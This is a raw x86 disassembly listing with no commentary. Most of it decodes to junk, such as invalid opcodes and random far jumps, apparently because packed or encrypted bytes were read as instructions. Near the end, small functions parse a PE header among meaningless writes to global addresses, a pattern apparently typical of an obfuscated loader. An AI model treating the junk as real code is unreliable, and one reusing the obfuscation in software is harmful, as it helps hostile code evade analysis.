  40f26b:	pop    edi
  40f26c:	add    eax,esi
  40f26e:	jmp    0x40f634
  40f273:	xchg   ecx,eax
  40f274:	pushf  
  40f275:	out    0xec,al
  40f277:	icebp  
  40f278:	jbe    0x40f20b
  40f27a:	popa   
  40f27b:	out    dx,eax
  40f27c:	bound  ecx,QWORD PTR [edx-0x82ab27]
  40f282:	mov    edi,0x7c7caa61
  40f287:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f288:	jns    0x40f306
  40f28a:	jl     0x40f298
  40f28c:	pop    esi
  40f28d:	jmp    0xac354876
  40f292:	ja     0x40f21a
  40f294:	cmp    edi,DWORD PTR [ecx+edi*1+0x9]
  40f298:	leave  
  40f299:	xor    al,0x62
  40f29b:	clc    
  40f29c:	(bad)  
  40f29d:	(bad)  
  40f29f:	push   esi
  40f2a0:	fisubr WORD PTR [esi]
  40f2a2:	pop    eax
  40f2a3:	fnstcw WORD PTR [edx-0x50]
  40f2a6:	je     0x40f323
  40f2a8:	imul   esi,ebp,0xfffffff9
  40f2ab:	cli    
  40f2ac:	shl    BYTE PTR [eax-0x3a],cl
  40f2af:	out    0x6c,al
  40f2b1:	std    
  40f2b2:	outs   dx,BYTE PTR ds:[esi]
  40f2b3:	push   ecx
  40f2b4:	dec    edi
  40f2b5:	scas   eax,DWORD PTR es:[edi]
  40f2b6:	outs   dx,DWORD PTR ds:[esi]
  40f2b7:	cwde   
  40f2b8:	loop   0x40f2a1
  40f2ba:	sbb    BYTE PTR [ebx-0x2c89ed7d],bl
  40f2c0:	jnp    0x40f2dd
  40f2c2:	and    bh,BYTE PTR [esi]
  40f2c4:	inc    esi
  40f2c5:	mov    bh,0x30
  40f2c7:	pop    ecx
  40f2c8:	add    esi,ebx
  40f2ca:	sub    BYTE PTR [esi],0x11
  40f2cd:	push   eax
  40f2ce:	sub    ebp,DWORD PTR [esi+eiz*8-0x79]
  40f2d2:	scas   eax,DWORD PTR es:[edi]
  40f2d3:	mov    eax,ds:0xa2edbb50
  40f2d8:	add    BYTE PTR [eax-0x137710b6],cl
  40f2de:	in     eax,dx
  40f2df:	pop    ecx
  40f2e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f2e1:	bound  ecx,QWORD PTR [edx+0x69]
  40f2e4:	stos   DWORD PTR es:[edi],eax
  40f2e5:	and    ebp,DWORD PTR [esi]
  40f2e7:	pop    edi
  40f2e8:	into   
  40f2e9:	push   eax
  40f2ea:	ficomp DWORD PTR [edi-0x18]
  40f2ed:	int    0x7d
  40f2ef:	hlt    
  40f2f0:	stc    
  40f2f1:	shl    BYTE PTR [esp+ebx*1+0x37bce230],1
  40f2f8:	xchg   esp,eax
  40f2f9:	dec    edx
  40f2fa:	dec    ebp
  40f2fb:	imul   edx,esi,0xfe88403e
  40f301:	jns    0x40f2c5
  40f303:	int    0xdf
  40f305:	add    BYTE PTR [esi-0x15],cl
  40f308:	das    
  40f309:	sub    bl,BYTE PTR [edx-0x75]
  40f30c:	loopne 0x40f2a8
  40f30e:	lods   al,BYTE PTR ss:[esi]
  40f310:	dec    eax
  40f311:	dec    ebp
  40f312:	jno    0x40f36a
  40f314:	fisttp QWORD PTR [ebp+edx*2+0x2081c5]
  40f31b:	pop    eax
  40f31c:	push   ss
  40f31d:	cmp    al,0x7f
  40f31f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f320:	es nop
  40f322:	push   0x7116798c
  40f327:	push   edi
  40f328:	jbe    0x40f301
  40f32a:	cmp    al,0x94
  40f32c:	dec    eax
  40f32d:	cmp    DWORD PTR [ebp-0x369f2b49],edx
  40f333:	sub    edi,DWORD PTR [ebp-0x15]
  40f336:	repz test DWORD PTR [edi],ebp
  40f339:	xor    DWORD PTR [ebx-0x7352aed4],ebx
  40f33f:	aaa    
  40f340:	mov    dl,ah
  40f342:	mov    ebp,DWORD PTR [eax]
  40f344:	inc    edx
  40f345:	fsubr  QWORD PTR [eax+0x1c8df400]
  40f34b:	push   ds
  40f34c:	mov    cl,BYTE PTR [ecx-0x201f1505]
  40f352:	push   ebp
  40f353:	jmp    0xa2f2:0x9f6919c2
  40f35a:	ficomp DWORD PTR [ebx+eiz*8-0x144b0650]
  40f361:	call   0xdd16:0x3291d5a7
  40f368:	enter  0xb95f,0x2a
  40f36c:	mov    ecx,0x2047cbbf
  40f371:	xchg   esi,eax
  40f372:	fsubr  QWORD PTR [ecx+0x678f2d24]
  40f378:	loop   0x40f3e2
  40f37a:	mov    WORD PTR fs:[ecx],es
  40f37d:	lods   al,BYTE PTR ds:[esi]
  40f37e:	xchg   DWORD PTR ds:0xcaa0a8f6,ecx
  40f384:	pop    edi
  40f385:	push   ss
  40f386:	mov    eax,ds:0x1e38dff8
  40f38b:	cli    
  40f38c:	imul   ebx,esi,0x6c
  40f38f:	iret   
  40f390:	and    al,0xb2
  40f392:	stos   BYTE PTR es:[edi],al
  40f393:	ins    BYTE PTR es:[edi],dx
  40f394:	test   BYTE PTR [ecx],al
  40f396:	adc    al,0xa1
  40f398:	in     al,dx
  40f399:	push   ebx
  40f39a:	cld    
  40f39b:	and    esi,edi
  40f39d:	iret   
  40f39e:	xchg   esi,eax
  40f39f:	jg     0x40f344
  40f3a1:	sbb    DWORD PTR [ebx-0x6d14a32],0x5f2ade0b
  40f3ab:	mov    ds:0x2af55e9e,eax
  40f3b0:	cdq    
  40f3b1:	in     al,0x4e
  40f3b3:	pushf  
  40f3b4:	loopne 0x40f417
  40f3b6:	cmp    al,0xf
  40f3b8:	push   edx
  40f3b9:	sub    dh,BYTE PTR [edi+0x17]
  40f3bc:	push   cs
  40f3bd:	xchg   edi,eax
  40f3be:	mov    al,ds:0x1a7d8faa
  40f3c3:	pop    esi
  40f3c4:	xchg   edx,edi
  40f3c6:	jl     0x40f3cf
  40f3c8:	(bad)  
  40f3c9:	retf   0x3188
  40f3cc:	push   esp
  40f3cd:	add    esp,DWORD PTR [eax+0x6678e0ca]
  40f3d3:	xchg   edi,eax
  40f3d4:	mov    ebx,DWORD PTR [esi]
  40f3d6:	adc    edi,ebx
  40f3d8:	jnp    0x40f3f0
  40f3da:	mov    cl,bh
  40f3dc:	add    esp,edi
  40f3de:	xchg   esp,eax
  40f3df:	inc    esp
  40f3e0:	shl    BYTE PTR [eax+0x140d6bb8],0xe1
  40f3e7:	xor    cl,BYTE PTR [ecx-0x5f]
  40f3ea:	add    esp,DWORD PTR [eax-0xd]
  40f3ed:	inc    ebp
  40f3ee:	rcr    DWORD PTR [esi+0x676467f4],cl
  40f3f4:	hlt    
  40f3f5:	call   0x685bcef9
  40f3fa:	mov    ebp,0x887935ad
  40f3ff:	shr    cl,1
  40f401:	adc    eax,0xe4f6b722
  40f406:	dec    ecx
  40f407:	mov    eax,ds:0x75ab4d06
  40f40c:	inc    edi
  40f40d:	xor    BYTE PTR [edi],bh
  40f40f:	push   ebx
  40f410:	popf   
  40f411:	mov    cl,0x61
  40f413:	sbb    eax,0xea99338d
  40f418:	nop
  40f419:	enter  0x89bf,0xee
  40f41d:	mov    ebp,0xd55fcd68
  40f422:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f423:	add    ah,dl
  40f425:	dec    ebx
  40f426:	pop    edx
  40f427:	push   ebx
  40f428:	in     eax,0x22
  40f42a:	dec    edi
  40f42b:	(bad)  
  40f42c:	sahf   
  40f42d:	cmp    al,BYTE PTR [ebx]
  40f42f:	xor    esp,DWORD PTR [ebx+0x3e322cbf]
  40f435:	sub    DWORD PTR [esi+0x6e14e0aa],ecx
  40f43b:	out    dx,al
  40f43c:	cli    
  40f43d:	test   eax,0x4a392b63
  40f442:	mov    esi,DWORD PTR [ebx+0x3c]
  40f445:	sbb    eax,0xffad911f
  40f44a:	out    0xb9,al
  40f44c:	into   
  40f44d:	ret    
  40f44e:	iret   
  40f44f:	push   ebx
  40f450:	mov    BYTE PTR [edx+0x73ca0b4d],dl
  40f456:	shl    ch,1
  40f458:	test   eax,0x4e66dff5
  40f45d:	int3   
  40f45e:	dec    esp
  40f45f:	stos   DWORD PTR es:[edi],eax
  40f460:	pushf  
  40f461:	clc    
  40f462:	xchg   edi,eax
  40f463:	gs (bad) 
  40f465:	clc    
  40f466:	int    0x2b
  40f468:	or     al,0xbd
  40f46a:	test   DWORD PTR [ebp+0x5d5aad41],ecx
  40f470:	add    ebx,DWORD PTR [edi+0x16]
  40f473:	mov    ecx,0xb232186e
  40f478:	mov    bl,0x82
  40f47a:	cli    
  40f47b:	sbb    al,0xec
  40f47d:	call   0x667a:0x97d4fc6d
  40f484:	popa   
  40f485:	xchg   edi,eax
  40f486:	outs   dx,BYTE PTR ds:[esi]
  40f487:	out    0xe5,al
  40f489:	enter  0xa2,0x2b
  40f48d:	fsave  [ebx-0x71d2b21f]
  40f494:	cmc    
  40f495:	in     al,0x14
  40f497:	sub    bl,BYTE PTR [eax]
  40f499:	add    edi,DWORD PTR [eax+0x7a945e64]
  40f49f:	loope  0x40f4ce
  40f4a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f4a2:	jl     0x40f499
  40f4a4:	addr16 int 0xee
  40f4a7:	f2xm1  
  40f4a9:	mov    dl,0x9b
  40f4ab:	push   edi
  40f4ac:	sbb    DWORD PTR [eax+0x5f58a7df],ebx
  40f4b2:	lea    edi,[edx]
  40f4b4:	out    dx,al
  40f4b5:	mov    bl,BYTE PTR [edi+ebx*1]
  40f4b8:	xor    DWORD PTR [esi],ebp
  40f4ba:	fucomp st(1)
  40f4bc:	and    dh,bl
  40f4be:	cmp    al,0x72
  40f4c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f4c1:	aas    
  40f4c2:	push   esp
  40f4c3:	mov    al,0x4e
  40f4c5:	fst    DWORD PTR [ebp-0x3fb8c5d5]
  40f4cb:	pop    esp
  40f4cc:	ins    DWORD PTR es:[edi],dx
  40f4cd:	xor    ecx,DWORD PTR [esi+0x21]
  40f4d0:	loopne 0x40f4e9
  40f4d2:	push   edi
  40f4d3:	(bad)  [ecx-0x6d79bc43]
  40f4d9:	inc    esp
  40f4da:	(bad)  
  40f4db:	lock in eax,0x30
  40f4de:	ret    0x15cb
  40f4e1:	jp     0x40f471
  40f4e3:	out    dx,al
  40f4e4:	rcr    ebp,cl
  40f4e6:	add    BYTE PTR [ebx+0x70226b54],bl
  40f4ec:	nop
  40f4ed:	xor    eax,0x9f94d354
  40f4f2:	out    dx,eax
  40f4f3:	dec    ebx
  40f4f4:	ins    DWORD PTR es:[edi],dx
  40f4f5:	and    ecx,DWORD PTR [ebx]
  40f4f7:	and    eax,DWORD PTR [edx+0x41]
  40f4fa:	jmp    0x40f574
  40f4fc:	stc    
  40f4fd:	out    dx,eax
  40f4fe:	jno    0x40f4fd
  40f500:	sub    al,0xac
  40f502:	or     DWORD PTR [ebx+edx*4],0xf777c928
  40f509:	inc    edx
  40f50a:	pop    ecx
  40f50b:	mov    WORD PTR ds:0xb18f4157,gs
  40f511:	or     BYTE PTR [edx+ebx*1],ch
  40f514:	test   BYTE PTR [ebx],ah
  40f516:	mov    WORD PTR [ebp+ebp*8+0x44],es
  40f51a:	cmp    eax,0x8e4dfd32
  40f51f:	dec    esi
  40f520:	ror    DWORD PTR [ebp+0x46],cl
  40f523:	(bad)  [ecx+eax*1-0x4e929ed9]
  40f52a:	data16 lock cli 
  40f52d:	xchg   ecx,eax
  40f52e:	inc    ebx
  40f52f:	jle    0x40f5a8
  40f531:	or     edi,edx
  40f533:	rcl    ch,cl
  40f535:	xor    DWORD PTR [esi],eax
  40f537:	in     al,dx
  40f538:	leave  
  40f539:	mov    ecx,0x1e4e7486
  40f53e:	aam    0xed
  40f540:	aas    
  40f541:	jecxz  0x40f589
  40f543:	enter  0x6b7a,0x5c
  40f547:	push   0x49
  40f549:	test   BYTE PTR [eax-0x18],ch
  40f54c:	jmp    0x40f56f
  40f54e:	sbb    ebx,eax
  40f550:	mov    ch,BYTE PTR [ebx]
  40f552:	push   ss
  40f553:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f554:	cwde   
  40f555:	fimul  WORD PTR [ebp+esi*1-0x1f9eb294]
  40f55c:	pop    ebp
  40f55d:	inc    esp
  40f55e:	popf   
  40f55f:	mov    ds:0x9a73c77f,eax
  40f564:	pop    ecx
  40f565:	shl    BYTE PTR [edi],1
  40f567:	repz and esi,DWORD PTR [esi]
  40f56a:	sti    
  40f56b:	sub    eax,0x5137ba99
  40f570:	adc    dh,BYTE PTR [ebx-0x39]
  40f573:	push   0x1d
  40f575:	sbb    al,0xf
  40f577:	jl     0x40f5f4
  40f579:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f57a:	test   eax,0x75318f0d
  40f57f:	xchg   ecx,eax
  40f580:	stc    
  40f581:	mov    eax,0xa545ad6
  40f586:	push   ss
  40f587:	cld    
  40f588:	out    dx,al
  40f589:	mov    esi,0xbca940c0
  40f58e:	retf   0x8f92
  40f591:	sbb    al,0xc5
  40f593:	(bad)  
  40f595:	mov    ds:0xc98336bf,eax
  40f59a:	test   eax,0x837eea28
  40f59f:	or     ebp,DWORD PTR [edi+edx*4-0x28]
  40f5a3:	daa    
  40f5a4:	or     DWORD PTR ds:[esi+0x357f0b9f],0xd95fb2e9
  40f5af:	mul    al
  40f5b1:	in     al,0x10
  40f5b3:	ins    DWORD PTR es:[edi],dx
  40f5b4:	pop    esi
  40f5b5:	sahf   
  40f5b6:	sub    ch,BYTE PTR [ecx+eax*1]
  40f5b9:	jmp    0x40f544
  40f5bb:	out    0x95,eax
  40f5bd:	test   eax,0xe6884d68
  40f5c2:	mov    cl,dl
  40f5c4:	dec    esp
  40f5c5:	aam    0x3c
  40f5c7:	inc    edi
  40f5c8:	pusha  
  40f5c9:	add    dh,BYTE PTR [ebx]
  40f5cb:	imul   esi,DWORD PTR [edi+edx*4],0xfffffff7
  40f5cf:	and    al,0x12
  40f5d1:	cwde   
  40f5d2:	loop   0x40f5be
  40f5d4:	inc    esi
  40f5d5:	or     al,0x73
  40f5d7:	mov    ebp,?
  40f5d9:	shr    dh,1
  40f5db:	pop    esp
  40f5dc:	inc    ebx
  40f5dd:	ss retf 
  40f5df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f5e0:	ret    0xbc33
  40f5e3:	dec    esp
  40f5e4:	cmp    BYTE PTR [ebx],ch
  40f5e6:	push   esi
  40f5e7:	xchg   edi,eax
  40f5e8:	nop
  40f5e9:	xor    dl,dh
  40f5eb:	shr    BYTE PTR [ebx],0x99
  40f5ee:	daa    
  40f5ef:	inc    ecx
  40f5f0:	mov    eax,ds:0xccb3f17e
  40f5f5:	mov    es,WORD PTR [ecx]
  40f5f7:	adc    al,0xf9
  40f5f9:	jbe    0x40f655
  40f5fb:	push   ecx
  40f5fc:	aad    0xaa
  40f5fe:	jne    0x40f64b
  40f600:	inc    ebp
  40f601:	leave  
  40f602:	xchg   esi,eax
  40f604:	sti    
  40f605:	push   ebp
  40f606:	test   al,0x73
  40f608:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f609:	push   cs
  40f60a:	cmp    DWORD PTR [ebx],edx
  40f60c:	fdiv   DWORD PTR [ecx-0x3d]
  40f60f:	fwait
  40f610:	add    dh,0xcc
  40f613:	adc    al,0xa9
  40f615:	dec    ecx
  40f616:	inc    eax
  40f617:	sub    eax,0xdf52199a
  40f61c:	push   cs
  40f61d:	push   ss
  40f61e:	int    0xa4
  40f620:	pop    ds
  40f621:	call   0xcb5f6f2f
  40f626:	scas   eax,DWORD PTR es:[edi]
  40f627:	sar    DWORD PTR [edi+ebx*8+0xc],1
  40f62b:	mov    ch,0x82
  40f62d:	inc    ecx
  40f62e:	inc    ecx
  40f62f:	jge    0x40f668
  40f631:	fadd   QWORD PTR [edi+0x3]
  40f634:	pop    esi
  40f635:	leave  
  40f636:	ret    0xc
  40f639:	push   ebp
  40f63a:	mov    ebp,esp
  40f63c:	push   ecx
  40f63d:	mov    DWORD PTR [ebp-0x4],0xf89c8535
  40f644:	mov    eax,DWORD PTR [ebp+0x8]
  40f647:	sbb    DWORD PTR ds:0x4335ef,0x1bf0
  40f651:	mov    al,BYTE PTR [eax]
  40f653:	and    DWORD PTR ds:0x4335df,0x4335a3
  40f65d:	jmp    0x40f925
  40f662:	pop    es
  40f663:	sbb    DWORD PTR [edx],ebp
  40f665:	pop    ecx
  40f666:	xor    dh,BYTE PTR [ebp+0x53]
  40f669:	popa   
  40f66a:	inc    eax
  40f66b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f66c:	push   esi
  40f66d:	call   0xb688:0xd6d91c2a
  40f674:	jl     0x40f6f2
  40f676:	mov    eax,ds:0x727c7c7e
  40f67b:	lods   eax,DWORD PTR ds:[esi]
  40f67c:	outs   dx,DWORD PTR ds:[esi]
  40f67d:	pop    esp
  40f67e:	jbe    0x40f6d6
  40f680:	inc    ebp
  40f681:	sbb    eax,0x71624bb1
  40f686:	js     0x40f69c
  40f688:	inc    edx
  40f689:	pop    ss
  40f68a:	fsubr  QWORD PTR [esi+0x47536329]
  40f690:	outs   dx,DWORD PTR ds:[esi]
  40f691:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f692:	iret   
  40f693:	inc    eax
  40f694:	dec    esi
  40f695:	iret   
  40f696:	and    BYTE PTR ds:0xcb52c784,dh
  40f69c:	sub    al,0x8f
  40f69e:	mov    cl,0x24
  40f6a0:	adc    ch,BYTE PTR [esi]
  40f6a2:	and    al,al
  40f6a4:	and    eax,0x73743e62
  40f6a9:	mov    ah,0x3d
  40f6ab:	xchg   BYTE PTR [edi-0xb],dl
  40f6ae:	test   al,bh
  40f6b0:	cmp    esi,edi
  40f6b2:	imul   edi,DWORD PTR [ecx],0x84a9e4da
  40f6b8:	cmp    bh,BYTE PTR [eax]
  40f6ba:	in     eax,dx
  40f6bb:	mov    ds:0x615882a3,eax
  40f6c0:	ins    BYTE PTR es:[edi],dx
  40f6c1:	pop    esi
  40f6c2:	xchg   ebp,eax
  40f6c3:	and    al,0xe5
  40f6c5:	retf   0x844
  40f6c8:	sti    
  40f6c9:	pop    ebp
  40f6ca:	arpl   WORD PTR [ebx-0x5bbbaf9f],bx
  40f6d0:	jno    0x40f6b5
  40f6d2:	push   cs
  40f6d3:	cmp    ch,BYTE PTR [ecx+0x246f7e03]
  40f6d9:	cld    
  40f6da:	or     ebp,DWORD PTR [eax-0x7a4d444b]
  40f6e0:	pop    edx
  40f6e1:	(bad)  
  40f6e2:	std    
  40f6e3:	ret    
  40f6e4:	shl    DWORD PTR [ecx-0x29b21b35],1
  40f6ea:	dec    ebx
  40f6eb:	loopne 0x40f6e5
  40f6ed:	adc    bh,BYTE PTR [bp+si-0x224d]
  40f6f2:	rcr    BYTE PTR [ebx-0x79],cl
  40f6f5:	inc    ebp
  40f6f6:	pop    ss
  40f6f7:	dec    esi
  40f6f8:	rcr    al,cl
  40f6fa:	adc    ebp,DWORD PTR [edi+0x7e]
  40f6fd:	mov    esi,0xbc23a645
  40f702:	je     0x40f6a6
  40f704:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f705:	out    0x71,al
  40f707:	mov    al,ds:0x31b5055c
  40f70c:	pop    esi
  40f70d:	cmp    al,0x62
  40f70f:	rcr    DWORD PTR [eax+ebx*1-0x67a80a52],cl
  40f716:	jecxz  0x40f779
  40f718:	int    0x24
  40f71a:	pushf  
  40f71b:	fistp  QWORD PTR [eax]
  40f71d:	cmp    BYTE PTR [eax-0x28c89ea5],dl
  40f723:	call   DWORD PTR [eax]
  40f725:	pop    edx
  40f726:	cmp    eax,0x6a30a869
  40f72b:	outs   dx,DWORD PTR ds:[esi]
  40f72c:	cli    
  40f72d:	push   edi
  40f72e:	cli    
  40f72f:	dec    ebx
  40f730:	sar    ecx,cl
  40f732:	(bad)  
  40f733:	ss les eax,FWORD PTR es:[edx+0x65d4dfe2]
  40f73b:	ins    DWORD PTR es:[edi],dx
  40f73c:	mov    esi,0x84dbc71a
  40f741:	inc    edi
  40f742:	pop    ecx
  40f743:	arpl   WORD PTR [eax],bp
  40f745:	cmp    edx,esp
  40f747:	mov    dh,0xfe
  40f749:	cld    
  40f74a:	scas   al,BYTE PTR es:[edi]
  40f74b:	mov    bh,0x1d
  40f74d:	addr16 inc edi
  40f74f:	ret    0x5f70
  40f752:	out    0x64,eax
  40f754:	dec    eax
  40f755:	sbb    dl,BYTE PTR [eax+0x544a9259]
  40f75b:	nop
  40f75c:	mov    DWORD PTR [eax+0x6f],edx
  40f75f:	xchg   ecx,eax
  40f760:	xchg   ecx,eax
  40f761:	in     eax,dx
  40f762:	aad    0xeb
  40f764:	lahf   
  40f765:	pop    ecx
  40f766:	mov    dh,0xf1
  40f768:	inc    ebx
  40f769:	jns    0x40f774
  40f76b:	jmp    0x5eaf4be6
  40f770:	push   ecx
  40f771:	test   al,0xd7
  40f773:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f774:	mov    edi,0xd269eaa6
  40f779:	popa   
  40f77a:	stc    
  40f77b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f77c:	retf   
  40f77d:	icebp  
  40f77e:	mov    al,ds:0x6ed3a0bc
  40f783:	outs   dx,DWORD PTR ds:[esi]
  40f784:	loope  0x40f802
  40f786:	mov    bl,0x79
  40f788:	xchg   ebx,eax
  40f789:	adc    ecx,DWORD PTR [ebp+0x1e761c4]
  40f78f:	int3   
  40f790:	icebp  
  40f791:	and    ah,dl
  40f793:	mov    ebp,0xfbaab399
  40f798:	pop    ds
  40f799:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f79a:	xchg   edx,eax
  40f79b:	in     al,dx
  40f79c:	popf   
  40f79d:	cld    
  40f79e:	inc    ebp
  40f79f:	or     eax,0x6eae0e38
  40f7a4:	mov    cl,0x2e
  40f7a6:	push   ebp
  40f7a7:	dec    esp
  40f7a8:	div    DWORD PTR [ebx+0x75]
  40f7ab:	aam    0xf2
  40f7ad:	mov    WORD PTR [ecx],es
  40f7af:	xor    al,0xa5
  40f7b1:	xor    dh,dl
  40f7b3:	xchg   edx,eax
  40f7b4:	inc    esi
  40f7b5:	call   0x99f0:0xc2eb0cd7
  40f7bc:	or     eax,0xb045a62d
  40f7c1:	jns    0x40f774
  40f7c3:	push   esi
  40f7c4:	push   esp
  40f7c5:	push   ds
  40f7c6:	nop
  40f7c7:	int3   
  40f7c8:	jg     0x40f840
  40f7ca:	arpl   sp,sp
  40f7cc:	(bad)  
  40f7cd:	mov    esp,0x26bef4a2
  40f7d2:	pop    edi
  40f7d3:	sub    eax,DWORD PTR [edi-0x55]
  40f7d6:	ss pushf 
  40f7d8:	ja     0x40f78a
  40f7da:	push   cs
  40f7db:	adc    bh,dl
  40f7dd:	mov    al,0x9d
  40f7df:	mov    ds:0x3999948b,eax
  40f7e4:	xor    cl,BYTE PTR [edx+0x8c3f45a]
  40f7ea:	dec    ecx
  40f7eb:	outs   dx,DWORD PTR ds:[esi]
  40f7ec:	push   eax
  40f7ed:	jno    0x40f782
  40f7ef:	aad    0xae
  40f7f1:	pop    edx
  40f7f2:	test   eax,0x9b1dc9ee
  40f7f7:	xor    cl,ah
  40f7f9:	mov    dl,0x86
  40f7fb:	pop    ds
  40f7fc:	xchg   esp,eax
  40f7fd:	inc    esp
  40f7fe:	jbe    0x40f838
  40f800:	sub    al,0xe0
  40f802:	mov    ds:0xa8c390c8,al
  40f807:	jns    0x40f85b
  40f809:	sub    edx,DWORD PTR [ecx+0x3a0a9d0f]
  40f80f:	daa    
  40f810:	or     DWORD PTR [esi],ecx
  40f812:	es inc esi
  40f814:	jae    0x40f7c6
  40f816:	fiadd  DWORD PTR [esi+0x61]
  40f819:	call   0x2a0e:0x70f66ba7
  40f820:	leave  
  40f821:	add    al,0x47
  40f823:	inc    ebx
  40f824:	ret    0x8a1f
  40f827:	push   eax
  40f828:	outs   dx,BYTE PTR ds:[esi]
  40f829:	dec    edx
  40f82a:	imul   esp,DWORD PTR [edx],0xa469b096
  40f830:	js     0x40f838
  40f832:	adc    ecx,DWORD PTR [edi+0x33f68ed4]
  40f838:	mov    ds:0x5a9f1225,eax
  40f83d:	int3   
  40f83e:	imul   edi,DWORD PTR [edi-0x451f6d8b],0x4d98a431
  40f848:	jne    0x40f81d
  40f84a:	push   edx
  40f84b:	ins    DWORD PTR es:[edi],dx
  40f84c:	(bad)
  40f84f:	mov    edi,0x4e38b489
  40f854:	test   DWORD PTR [ebp+0x7b9ca735],edx
  40f85a:	hlt    
  40f85b:	sbb    eax,0xce946385
  40f860:	jno    0x40f837
  40f862:	and    DWORD PTR [ebp+edx*4-0x2b47a465],eax
  40f869:	lods   al,BYTE PTR gs:[esi]
  40f86b:	dec    eax
  40f86c:	retf   
  40f86d:	jl     0x40f870
  40f86f:	int    0x47
  40f871:	pop    edx
  40f872:	sbb    eax,0xec20cc8f
  40f877:	test   BYTE PTR [edx-0x41],0x30
  40f87b:	push   ebx
  40f87c:	mov    ch,0x8f
  40f87e:	add    edi,DWORD PTR [ebp-0x78]
  40f881:	call   0xb6c3:0xbe00d9b7
  40f888:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f889:	or     BYTE PTR [ebx],0x3e
  40f88c:	arpl   WORD PTR [eax+esi*2+0x4],sp
  40f890:	dec    ebx
  40f891:	dec    esp
  40f892:	pop    eax
  40f893:	std    
  40f894:	sbb    eax,0x10af018a
  40f899:	lea    ebx,[edi]
  40f89b:	enter  0x740c,0x29
  40f89f:	mov    ds:0x450d9ce0,eax
  40f8a4:	aaa    
  40f8a5:	pop    es
  40f8a6:	iret   
  40f8a7:	jno    0x40f8b5
  40f8a9:	out    dx,eax
  40f8aa:	mov    ecx,?
  40f8ac:	imul   ecx,ecx,0xae223bed
  40f8b2:	(bad)  [edx+0x79]
  40f8b5:	test   BYTE PTR ds:[ebx+edx*2-0x11e1b1ae],ah
  40f8bd:	stos   DWORD PTR es:[edi],eax
  40f8be:	xor    edi,edi
  40f8c0:	data16 js 0x40f916
  40f8c3:	popf   
  40f8c4:	jnp    0x40f906
  40f8c6:	int    0xd0
  40f8c8:	sahf   
  40f8c9:	sbb    eax,0x61f88e46
  40f8ce:	cmp    esp,DWORD PTR [edi+0xb]
  40f8d1:	ss repnz loop 0x40f930
  40f8d5:	(bad)  
  40f8d6:	jns    0x40f8e4
  40f8d8:	jl     0x40f8c0
  40f8da:	sub    bh,BYTE PTR [esi]
  40f8dc:	fcomp  DWORD PTR [eax+0x1e26fdc4]
  40f8e2:	ret    
  40f8e3:	popa   
  40f8e4:	rcl    DWORD PTR [edx+0x409160fc],1
  40f8ea:	cmp    eax,0x47948836
  40f8ef:	xor    cl,BYTE PTR [ebx-0x6dee170]
  40f8f5:	mov    esp,0xa09e0eb8
  40f8fa:	in     eax,0xbd
  40f8fc:	adc    al,0xe2
  40f8fe:	xchg   BYTE PTR [edi],dh
  40f900:	mov    ch,0xd8
  40f902:	cmp    cl,bh
  40f904:	cmp    esi,edi
  40f906:	idiv   DWORD PTR [edi]
  40f908:	in     al,dx
  40f909:	mov    al,dl
  40f90b:	push   es
  40f90c:	retf   0x75d6
  40f90f:	adc    DWORD PTR [ebp+0x7f],ebp
  40f912:	ror    ecx,cl
  40f914:	jae    0x40f947
  40f916:	add    DWORD PTR [esi],ebp
  40f918:	retf   
  40f919:	fisttp WORD PTR [edi+0x1071d3da]
  40f91f:	into   
  40f920:	or     eax,0xa3dd9371
  40f925:	add    al,0x39
  40f927:	and    DWORD PTR ds:0x43362b,0x4335a7
  40f931:	xor    al,0x45
  40f933:	cmp    al,0xc3
  40f935:	jne    0x40f9bc
  40f93b:	adc    ecx,edx
  40f93d:	mov    eax,DWORD PTR [ebp+0x8]
  40f940:	movzx  ecx,WORD PTR ds:0x43355f
  40f947:	add    DWORD PTR ds:0x433547,ecx
  40f94d:	mov    ecx,DWORD PTR [ebp+0x8]
  40f950:	add    ecx,DWORD PTR [eax+0x3c]
  40f953:	sub    DWORD PTR ds:0x43362f,0x5c72
  40f95d:	mov    edx,0x7510853
  40f962:	add    DWORD PTR ds:0x433617,0x767c
  40f96c:	mov    DWORD PTR [ebp+0x8],ecx
  40f96f:	adc    eax,DWORD PTR ds:0x4335a7
  40f975:	mov    eax,DWORD PTR [ebp-0x4]
  40f978:	movzx  ecx,BYTE PTR ds:0x433663
  40f97f:	adc    ecx,DWORD PTR ds:0x4335ab
  40f985:	mov    DWORD PTR ds:0x433663,ecx
  40f98b:	xor    eax,edx
  40f98d:	push   esi
  40f98e:	xor    esi,0x76d3
  40f994:	mov    esi,DWORD PTR [ebp+0x8]
  40f997:	mov    ecx,0x32729a
  40f99c:	add    eax,ecx
  40f99e:	cmp    DWORD PTR [esi+0x54],eax
  40f9a1:	pop    esi
  40f9a2:	je     0x40f9b0
  40f9a8:	mov    eax,DWORD PTR [ebp+0x8]
  40f9ab:	jmp    0x40f9c9
  40f9b0:	mov    eax,DWORD PTR [ebp-0x4]
  40f9b3:	xor    eax,edx
  40f9b5:	add    eax,ecx
  40f9b7:	jmp    0x40f9c9
  40f9bc:	mov    eax,DWORD PTR [ebp-0x4]
  40f9bf:	xor    eax,0x7510853
  40f9c4:	add    eax,0x32729a
  40f9c9:	leave  
  40f9ca:	ret    0x4
  40f9cd:	push   ebp
  40f9ce:	mov    ebp,esp
  40f9d0:	push   ecx
  40f9d1:	mov    ecx,DWORD PTR [ebp+0x8]
  40f9d4:	mov    eax,0x7510853
  40f9d9:	or     DWORD PTR ds:0x4335b3,0x4335af
  40f9e3:	xor    ecx,eax
